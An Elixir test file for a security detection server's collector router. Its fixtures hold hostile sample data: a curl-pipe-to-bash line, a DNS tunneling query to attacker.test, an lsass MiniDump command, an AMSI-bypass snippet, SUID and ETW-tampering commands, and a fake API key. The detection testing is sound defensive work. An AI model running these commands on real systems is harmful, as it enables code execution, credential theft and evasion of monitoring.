defmodule TamanduaServer.Detection.CollectorRouterTest do
  use ExUnit.Case, async: true

  alias TamanduaServer.Detection.CollectorRouter

  test "routes AMSI/script collector telemetry to script analyzer detections" do
    event = %{
      event_type: "script_execution",
      payload: %{
        "command_line" => "powershell -enc ZQBjAGgAbwAgAHQAZQBzAHQA"
      }
    }

    detections =
      CollectorRouter.analyze(event, %{
        collector: "amsi",
        family: "process",
        event_type: "script_execution"
      })

    assert [%{type: :collector_script_behavior} = detection] = detections
    assert detection.confidence > 0.0
    assert "encoded_command" in detection.matched_patterns
    assert_common_metadata(detection, "amsi")
  end

  test "ignores script analyzer for collectors that do not own script telemetry" do
    event = %{
      event_type: "process_create",
      payload: %{"command_line" => "curl http://example.test | bash"}
    }

    assert [] =
             CollectorRouter.analyze(event, %{
               collector: "process",
               family: "process",
               event_type: "process_create"
             })
  end

  test "detects ebpf and auditd kernel telemetry heuristics" do
    ebpf_event = %{
      event_type: "kernel_module_load",
      payload: %{
        "path" => "/tmp/kprobe_rootkit.ko",
        "unsigned" => true,
        "syscall" => "init_module"
      }
    }

    auditd_event = %{
      event_type: "audit_exec",
      payload: %{
        "path" => "/tmp/suid-helper",
        "mode" => "4755",
        "command_line" => "chmod 4755 /tmp/suid-helper"
      }
    }

    ebpf_detection =
      ebpf_event
      |> CollectorRouter.analyze(%{collector: "ebpf", event_type: "kernel_module_load"})
      |> only_detection(:collector_kernel_module_load)

    auditd_detection =
      auditd_event
      |> CollectorRouter.analyze(%{collector: "auditd", event_type: "audit_exec"})
      |> only_detection(:collector_privilege_escalation)

    assert "T1547.006" in ebpf_detection.mitre_techniques
    assert "T1548.001" in auditd_detection.mitre_techniques
    assert_common_metadata(ebpf_detection, "ebpf")
    assert_common_metadata(auditd_detection, "auditd")
  end

  test "detects network_dpi remote admin and dns tunneling signals" do
    remote_admin_event = %{
      event_type: "flow_summary",
      payload: %{
        "protocol" => "smb",
        "dest_port" => 445,
        "share" => "ADMIN$",
        "rpc_interface" => "svcctl"
      }
    }

    dns_event = %{
      event_type: "dns_message",
      payload: %{
        "protocol" => "dns",
        "query" => "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY.attacker.test"
      }
    }

    remote_admin_detection =
      remote_admin_event
      |> CollectorRouter.analyze(%{collector: "network_dpi", event_type: "flow_summary"})
      |> only_detection(:collector_lateral_movement)

    dns_detection =
      dns_event
      |> CollectorRouter.analyze(%{collector: "network_dpi", event_type: "dns_message"})
      |> only_detection(:collector_dns_tunneling)

    assert "T1021" in remote_admin_detection.mitre_techniques
    assert "T1071.004" in dns_detection.mitre_techniques
    assert_common_metadata(remote_admin_detection, "network_dpi")
    assert_common_metadata(dns_detection, "network_dpi")
  end

  test "detects identity password spray and directory replication abuse" do
    spray_event = %{
      event_type: "identity_batch",
      payload: %{
        "source_ip" => "10.0.0.50",
        "failed_count" => 24,
        "unique_users" => 12
      }
    }

    dcsync_event = %{
      event_type: "identity_directory_event",
      payload: %{
        "operation" => "DRSUAPI Replicating Directory Changes",
        "source_role" => "workstation",
        "username" => "svc-backup"
      }
    }

    spray_detection =
      spray_event
      |> CollectorRouter.analyze(%{collector: "identity", event_type: "identity_batch"})
      |> only_detection(:collector_password_spray)

    dcsync_detection =
      dcsync_event
      |> CollectorRouter.analyze(%{collector: "identity", event_type: "identity_directory_event"})
      |> only_detection(:collector_dcsync)

    assert "T1110.003" in spray_detection.mitre_techniques
    assert "T1003.006" in dcsync_detection.mitre_techniques
    assert_common_metadata(spray_detection, "identity")
    assert_common_metadata(dcsync_detection, "identity")
  end

  test "detects endpoint_security credential dumping and tampering signals" do
    event = %{
      event_type: "edr_behavior",
      payload: %{
        "target_process" => "lsass.exe",
        "command_line" =>
          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 744 C:\\Temp\\lsass.dmp full",
        "action" => "disabled",
        "product" => "Defender"
      }
    }

    detections =
      CollectorRouter.analyze(event, %{collector: "endpoint_security", event_type: "edr_behavior"})

    credential_dumping = only_detection(detections, :collector_credential_dumping)
    tampering = only_detection(detections, :collector_endpoint_tampering)

    assert "T1003.001" in credential_dumping.mitre_techniques
    assert "T1562.001" in tampering.mitre_techniques
    assert_common_metadata(credential_dumping, "endpoint_security")
    assert_common_metadata(tampering, "endpoint_security")
  end

  test "detects amsi bypass and etw provider tampering signals" do
    amsi_event = %{
      event_type: "script_scan",
      payload: %{
        "script_content" =>
          "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
      }
    }

    etw_event = %{
      event_type: "trace_control",
      payload: %{
        "operation" => "Disable provider",
        "provider_name" => "Microsoft-Windows-Threat-Intelligence",
        "command_line" => "logman stop tamandua-trace"
      }
    }

    amsi_detection =
      amsi_event
      |> CollectorRouter.analyze(%{collector: "amsi", event_type: "script_scan"})
      |> only_detection(:collector_amsi_bypass)

    etw_detection =
      etw_event
      |> CollectorRouter.analyze(%{collector: "etw", event_type: "trace_control"})
      |> only_detection(:collector_defense_evasion)

    assert "T1562.001" in amsi_detection.mitre_techniques
    assert "T1562.006" in etw_detection.mitre_techniques
    assert_common_metadata(amsi_detection, "amsi")
    assert_common_metadata(etw_detection, "etw")
  end

  test "does not run credential collector analyzer for EngineWorker-owned process and file event types" do
    process_event = %{
      event_type: "process_create",
      payload: %{
        "command_line" =>
          "python train.py --api-key sk-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
      }
    }

    file_event = %{
      event_type: "file_access",
      payload: %{"path" => "/srv/app/.env"}
    }

    assert [] =
             CollectorRouter.analyze(process_event, %{
               collector: "credential_theft",
               event_type: "process_create"
             })

    assert [] =
             CollectorRouter.analyze(file_event, %{
               collector: "credential_theft",
               event_type: "file_access"
             })
  end

  defp only_detection(detections, type) when is_list(detections) do
    assert detection = Enum.find(detections, &(&1.type == type))
    detection
  end

  defp assert_common_metadata(detection, collector) do
    assert detection.collector == collector
    assert is_binary(detection.rule_name)
    assert is_number(detection.confidence)
    assert is_list(detection.mitre_tactics)
    assert is_list(detection.mitre_techniques)
  end
end
